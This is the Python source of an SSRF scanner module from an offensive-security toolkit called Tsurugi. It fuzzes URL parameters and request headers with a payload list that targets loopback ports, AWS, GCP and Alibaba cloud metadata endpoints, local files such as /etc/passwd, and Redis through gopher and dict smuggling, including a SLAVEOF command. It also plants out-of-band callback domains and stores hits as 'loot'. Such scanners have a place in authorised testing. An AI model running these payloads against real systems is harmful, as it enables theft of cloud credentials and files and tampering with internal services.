# HikariSystem Tsurugi/modules/ssrf.py
"""
SSRF SCANNER MODULE
Detects Server-Side Request Forgery vulnerabilities (Blind & Full)
"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel

# Common SSRF Payloads
SSRF_PAYLOADS = [
    # Localhost / Loopback
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://localhost:80",
    "http://[::1]:80",
    "http://0.0.0.0:80",
    # Cloud Metadata
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/computeMetadata/v1/", # GCP
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    # Protocol Smuggling
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_SLAVEOF 127.0.0.1 6379",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

# Headers to inject into
SSRF_HEADERS = [
    "Referer",
    "X-Forwarded-For",
    "User-Agent",
    "X-Real-IP",
    "From",
    "X-Wap-Profile"
]


def run_ssrf_scan(url: str, cookie: str = None, proxy: str = None, oob_client=None):
    """
    Run SSRF scan injecting payloads into parameters and headers.
    Supports Blind SSRF via OOB client.
    """
    console.print(f"\n[bold magenta][*] SSRF SCANNER[/bold magenta] -> [yellow]{url}[/yellow]")
    
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # Analyze OOB capability
    live_oob = False
    oob_domain = None
    if oob_client and oob_client.registered:
        live_oob = True
        oob_domain = oob_client.domain
        console.print(f"[blue][*] OOB Mode Enabled: Using domain {oob_domain}[/blue]")
        
        # Add OOB payloads
        SSRF_PAYLOADS.append(f"http://{oob_domain}")
        SSRF_PAYLOADS.append(f"http://ssrf.{oob_domain}")
        SSRF_PAYLOADS.append(f"https://{oob_domain}")
    
    findings = []
    
    # 1. Parameter Injection
    if params:
        log_info(f"Fuzzing {len(params)} parameters with {len(SSRF_PAYLOADS)} payloads...")
        
        for param_name in params.keys():
            console.print(f"Testing param: [cyan]{param_name}[/cyan]")
            
            for payload in SSRF_PAYLOADS:
                # Create fuzzed URL
                fuzzed = params.copy()
                fuzzed[param_name] = [payload]
                query = urlencode(fuzzed, doseq=True)
                target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
                
                try:
                    # Send request
                    start_time = time.time()
                    resp = requester.get(target_url, timeout=5)
                    latency = time.time() - start_time
                    
                    # Analyze response (Full SSRF)
                    # Check for cloud metadata patterns
                    if "ami-id" in resp.text or "instance-id" in resp.text:
                        log_success(f"Potential AWS Metadata access found at {param_name}!")
                        findings.append({
                            "type": "Cloud Metadata (AWS)",
                            "param": param_name,
                            "payload": payload,
                            "evidence": "ami-id/instance-id in response"
                        })
                    
                    elif "root:x:0:0" in resp.text or "[extensions]" in resp.text:
                        log_success(f"LFI/File Access via SSRF found at {param_name}!")
                        findings.append({
                            "type": "File Access",
                            "param": param_name,
                            "payload": payload,
                            "evidence": "File content pattern in response"
                        })
                        
                    # Time-based check (if payload involves delay/timeout logic, implement later)
                        
                except Exception as e:
                    # Timeout *might* indicate firewall drop on internal IP, depends on context
                    pass
                    
    else:
        log_warning("No parameters found in URL to fuzz.")
        
    # 2. Header Injection (Blind mostly)
    log_info("Testing header injection (Blind/OOB)...")
    if live_oob:
        oob_payload = f"http://headers.{oob_domain}"
        
        for header in SSRF_HEADERS:
            headers = {header: oob_payload}
            try:
                requester.get(url, headers=headers)
                # We won't know immediately, OOB client checks later
            except:
                pass
    else:
        console.print("[dim]Skipping header injection (requires OOB for detection)[/dim]")

    # 3. Check OOB Interactions
    if live_oob:
        log_info("Checking Interactsh for callbacks...")
        time.sleep(3) # Wait for network propagation
        interactions = oob_client.poll_interactions()
        
        if interactions:
            for interaction in interactions:
                source_ip = interaction.get('remote-address')
                q_type = interaction.get('protocol')
                
                console.print(Panel(
                    f"Protocol: {q_type}\nSource IP: {source_ip}\nPayload Triggered: True",
                    title="[bold red]🚨 BLIND SSRF DETECTED![/bold red]",
                    border_style="red"
                ))
                
                findings.append({
                    "type": "Blind SSRF",
                    "details": interaction,
                    "location": "Parameter or Header (Correlation required)"
                })
        else:
            log_info("No OOB interactions received yet.")

    # Report
    if findings:
        save_loot("ssrf", url, {
            "target": url,
            "findings": findings
        })
        log_success(f"SSRF Scan finished. Found {len(findings)} issues.")
    else:
        console.print("[green]✓ No obvious SSRF vulnerabilities found.[/green]")
